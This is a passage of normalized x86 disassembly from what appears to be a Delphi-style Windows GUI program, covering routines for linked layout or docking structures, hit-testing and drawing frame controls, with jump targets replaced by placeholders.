mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_448e38
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_448fe0
jmp r-xdata
sub_448e38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44828c
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_4487d8
mov edx eax
mov eax ebx
call sub_448800
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_448800
mov eax [ esi + 0x64 ]
call sub_4487d8
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_449ea8
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_448b8c
mov eax [ esi + 0x64 ]
call sub_4487d8
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_449ea8
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_448b8c
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_44a22c
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_448b8c
mov eax [ esi + 0x64 ]
call sub_4487d8
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_44a360
xor edx edx
mov eax esi
call sub_448b8c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_448800
adc edx 0x0
mov eax ebx
call sub_4484c0
mov eax ebx
call sub_448850
push esi
push sub_44a360
xor edx edx
mov eax esi
call sub_448b8c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_448fe0
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_4484c0
mov eax [ ebx + 0x14 ]
call sub_448850
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_449058
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_4487d8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_4487d8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_4487d8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_4483a4
mov esi eax
mov edx 0x2
mov eax ebx
call sub_4483a4
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_4487d8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_4488b0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4488d8
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4488b0
call sub_449058
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4488d8
call sub_449058
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_448410
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_448410
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_449284
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4431c8
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44318c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_416114
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449318
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_449284
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_4488d8
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_448b24
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_4488d8
call sub_449058
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_4493a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_404038
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_404684
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_4493e8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4495e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_449ab8
mov eax [ ebp - 0x8 ]
call sub_448ab4
xor edx edx
push ebp
push sub_4495c3
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4495ca
mov eax [ ebp - 0x8 ]
call sub_448ab8
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44828c
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_4493a0
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_4034e4
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4485ac
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_4493a0
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_43fbd0
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_4409b0
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_4032e8
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_4495f0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_41613c
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42146c
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449648
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_420958
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_4210e8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_421088
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_421088
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_420958
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_421088
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_421088
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4496d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_4495f0
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_449648
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_449648
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_4495f0
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_449648
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_449648
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4497ac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d88
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_449902
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43e88c
mov eax [ ebp - 0x4 ]
call sub_4210c0
xor eax eax
push ebp
push sub_4498e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4214ec
xor eax eax
push ebp
push sub_4498c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_4431c8
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4498cf
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4214ec
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_44318c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43f650
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_449910
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_444fc8
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_43f6f8
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_43f6b4
mov ecx eax
xor edx edx
xor eax eax
call sub_41613c
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_4464d0
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416164
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_449a84
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_449a84
pop ecx
mov eax ebx
call sub_4032e8
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_449a84
pop ecx
sub_449ab8
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_449a84
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_4032e8
xor eax eax
mov [ esi + 0x64 ] eax
sub_449b14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448b24
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_449b50
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_449b50
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_449dbd
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405dec
mov edx [ ebp - 0x8 ]
pop eax
call sub_404300
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
mov eax [ ebx + 0x14 ]
call sub_4482b0
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405dec
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405dec
mov edx [ ebp - 0x10 ]
pop eax
call sub_404300
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_4032e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449dc4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40405c
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_448660
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_4487d8
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_448814
mov eax [ ebx + 0x18 ]
call sub_448660
mov [ edx + 0x18 ] eax
push esi
push sub_44a360
mov edx [ ebx + 0x14 ]
mov eax esi
